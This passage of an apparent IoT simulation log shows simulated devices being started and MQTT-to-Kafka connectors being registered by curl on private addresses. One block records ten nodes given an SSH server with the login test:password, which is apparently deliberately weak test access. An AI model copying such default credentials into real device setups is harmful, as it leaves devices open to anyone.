+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-51, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-47, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-16, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-8, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-53, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-2, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-5, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-14, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-52, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-1, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-55, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-12, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-40, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-28, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-25, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-3, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-45, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-24, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-13, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-20, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-57, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-18, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-37, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-8, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-58, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-19, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-11, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-54, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-2, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-10, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-19, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-21, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-22, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-5, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-33, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-36, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-7, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-1, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-7, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-19, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-20, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-22, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-18, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-26, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-11, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-12, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-16, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-60, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-24, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-15, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-9, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-11, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-9, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-29, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-3, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-42, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-23, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-1, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-7, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-4, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-20, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-28, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-21, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-39, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-4, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-3, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-48, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-49, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-24, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-23, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-46, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-17, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-domotic-monitor-bis-15, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-27, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-predictive-maintenance-44, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+node iotsim-cooler-motor-6, setting ENV... Starting node...
+log_match='[  ping   ] pinging'
+continue to next IoT device
+0 nodes failed to start
+node iotsim-domotic-monitor-bis-1: create user:password test:password, open ssh server
+node iotsim-domotic-monitor-bis-2: create user:password test:password, open ssh server
+node iotsim-domotic-monitor-bis-3: create user:password test:password, open ssh server
+node iotsim-domotic-monitor-bis-4: create user:password test:password, open ssh server
+node iotsim-domotic-monitor-bis-5: create user:password test:password, open ssh server
+node iotsim-cooler-motor-1: create user:password test:password, open ssh server
+node iotsim-cooler-motor-2: create user:password test:password, open ssh server
+node iotsim-cooler-motor-3: create user:password test:password, open ssh server
+node iotsim-cooler-motor-4: create user:password test:password, open ssh server
+node iotsim-cooler-motor-5: create user:password test:password, open ssh server
+ssh opened be open in iotsim-domotic-monitor-bis-1iotsim-domotic-monitor-bis-2iotsim-domotic-monitor-bis-3iotsim-domotic-monitor-bis-4iotsim-domotic-monitor-bis-5iotsim-cooler-motor-1iotsim-cooler-motor-2iotsim-cooler-motor-3iotsim-cooler-motor-4iotsim-cooler-motor-5
+starting node  sinetstream-zookeeper-1
+starting node  sinetstream-kafka-broker-1
+starting node  sinetstream-connect-kafka-1
+starting node  sinetstream-client-connect-1
+Container will execute command='curl http://192.168.15.12:8083'
+[start_sinetstream_nodes] wait for connect node to startup
+timeout=55 timeout=50 timeout=45 timeout=40 timeout=35 remove all previous connectors
+[91m Command output contains 'error'
+sh: 1: Syntax error: redirection unexpected
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt0_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-1", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490   5591   5000 --:--:-- --:--:-- --:--:-- 10701
+{"name":"source-mqtt0_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-1","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt0_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt1_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-2", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490   3382   3024 --:--:-- --:--:-- --:--:--  6447
+{"name":"source-mqtt1_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-2","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt1_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt2_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-3", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  34250  30625 --:--:-- --:--:-- --:--:-- 64875
+{"name":"source-mqtt2_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-3","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt2_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt3_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-4", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  27400  24500 --:--:-- --:--:-- --:--:-- 51900
+{"name":"source-mqtt3_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-4","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt3_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt4_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-5", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  34250  30625 --:--:-- --:--:-- --:--:-- 64875
+{"name":"source-mqtt4_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-5","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt4_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt5_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-6", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  32235  28823 --:--:-- --:--:-- --:--:-- 61058
+{"name":"source-mqtt5_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-6","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt5_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt6_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-7", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  42153  37692 --:--:-- --:--:-- --:--:-- 79846
+{"name":"source-mqtt6_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-7","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt6_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt7_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-8", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1038  100   548  100   490  39142  35000 --:--:-- --:--:-- --:--:-- 74142
+{"name":"source-mqtt7_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-8","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt7_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt8_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-9", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt8_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-9","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt8_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}100  1038  100   548  100   490  34250  30625 --:--:-- --:--:-- --:--:-- 69200
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt9_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-10", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1040  100   549  100   491  42230  37769 --:--:-- --:--:-- --:--:-- 80000
+{"name":"source-mqtt9_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-10","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt9_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt10_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-11", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 80230
+{"name":"source-mqtt10_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-11","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt10_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt11_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-12", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  42384  37846 --:--:-- --:--:-- --:--:-- 80230
+{"name":"source-mqtt11_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-12","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt11_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt12_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-13", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  34437  30750 --:--:-- --:--:-- --:--:-- 65187
+{"name":"source-mqtt12_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-13","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt12_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt13_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-14", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
